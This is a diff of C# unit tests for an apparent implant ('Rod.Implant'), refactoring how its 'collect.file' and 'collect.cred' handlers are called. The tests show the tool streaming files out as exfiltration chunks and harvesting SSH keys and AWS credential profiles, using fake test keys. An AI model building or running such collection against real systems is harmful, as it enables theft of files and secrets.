@@ -13,14 +13,14 @@ namespace Rod.Implant.Tests;
 // documented by the platform branch.
 public class CollectTests
 {
-    private static Runner NewRunner() => new();
+    private static HandlerRegistry NewRegistry() => HandlerRegistry.Default();
 
     [Fact]
     public void CollectFile_MissingFile_FailsWithCause()
     {
         using var dir = TempDir.Create();
-        var runner = NewRunner();
-        var (outcome, output, chunks) = runner.Dispatch(
+        var registry = NewRegistry();
+        var (outcome, output, chunks) = registry.Dispatch(
             "collect.file", Path.Combine(dir.Path, "absent"));
         Assert.Equal(TaskOutcome.Failed, outcome);
         Assert.Contains("stat ", output);
@@ -30,8 +30,8 @@ public class CollectTests
     [Fact]
     public void CollectFile_EmptyPath_FailsWithCause()
     {
-        var runner = NewRunner();
-        var (outcome, output, _) = runner.Dispatch("collect.file", "");
+        var registry = NewRegistry();
+        var (outcome, output, _) = registry.Dispatch("collect.file", "");
         Assert.Equal(TaskOutcome.Failed, outcome);
         Assert.Contains("collect.file expects", output);
     }
@@ -39,9 +39,9 @@ public class CollectTests
     [Fact]
     public void CollectFile_Directory_RefusesWithCause()
     {
-        var runner = NewRunner();
+        var registry = NewRegistry();
         using var dir = TempDir.Create();
-        var (outcome, output, _) = runner.Dispatch("collect.file", dir.Path);
+        var (outcome, output, _) = registry.Dispatch("collect.file", dir.Path);
         Assert.Equal(TaskOutcome.Failed, outcome);
         Assert.Contains("directory", output);
     }
@@ -49,13 +49,13 @@ public class CollectTests
     [Fact]
     public void CollectFile_SucceedsWithContents()
     {
-        var runner = NewRunner();
+        var registry = NewRegistry();
         using var dir = TempDir.Create();
         var path = Path.Combine(dir.Path, "note.txt");
         const string want = "hello collect.file";
         File.WriteAllBytes(path, Encoding.UTF8.GetBytes(want));
 
-        var (outcome, output, chunks) = runner.Dispatch("collect.file", path);
+        var (outcome, output, chunks) = registry.Dispatch("collect.file", path);
         Assert.Equal(TaskOutcome.Succeeded, outcome);
         Assert.Equal(want, output);
         Assert.Empty(chunks);
@@ -64,7 +64,7 @@ public class CollectTests
     [Fact]
     public void CollectFile_LargeFile_ProducesChunks()
     {
-        var runner = NewRunner();
+        var registry = NewRegistry();
         using var dir = TempDir.Create();
         var path = Path.Combine(dir.Path, "big.bin");
         // Just over the 1 MiB inline limit so the file streams as ExfilChunks.
@@ -74,7 +74,7 @@ public class CollectTests
             payload[i] = (byte)(i % 251);
         File.WriteAllBytes(path, payload);
 
-        var (outcome, output, chunks) = runner.Dispatch("collect.file", path);
+        var (outcome, output, chunks) = registry.Dispatch("collect.file", path);
         Assert.Equal(TaskOutcome.Succeeded, outcome);
         Assert.Contains("chunks streamed", output);
         Assert.NotEmpty(chunks);
@@ -92,8 +92,8 @@ public class CollectTests
     [Fact]
     public void CollectCred_UnknownSource_FailsWithCause()
     {
-        var runner = NewRunner();
-        var (outcome, output, _) = runner.Dispatch("collect.cred", "kerberos");
+        var registry = NewRegistry();
+        var (outcome, output, _) = registry.Dispatch("collect.cred", "kerberos");
         Assert.Equal(TaskOutcome.Failed, outcome);
         Assert.Contains("unknown source", output);
     }
@@ -119,8 +119,8 @@ public class CollectTests
             File.WriteAllText(Path.Combine(home.Path, ".ssh", "id_ed25519.pub"),
                 "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKdTestKeyRodCollectCredSSH collect-test\n");
 
-            var runner = NewRunner();
-            var (outcome, output, _) = runner.Dispatch("collect.cred", "ssh");
+            var registry = NewRegistry();
+            var (outcome, output, _) = registry.Dispatch("collect.cred", "ssh");
             Assert.Equal(TaskOutcome.Succeeded, outcome);
             Assert.Contains("id_bare", output);
             Assert.Contains("no .pub sibling", output);
@@ -148,8 +148,8 @@ public class CollectTests
                 "aws_access_key_id = AKIAOTHERKEYID5678\n" +
                 "aws_secret_access_key = aNoThErSeCrEtVaLuE0987654321\n");
 
-            var runner = NewRunner();
-            var (outcome, output, _) = runner.Dispatch("collect.cred", "aws");
+            var registry = NewRegistry();
+            var (outcome, output, _) = registry.Dispatch("collect.cred", "aws");
             Assert.Equal(TaskOutcome.Succeeded, outcome);
             Assert.Contains("aws default", output);
             Assert.Contains("aws work", output);
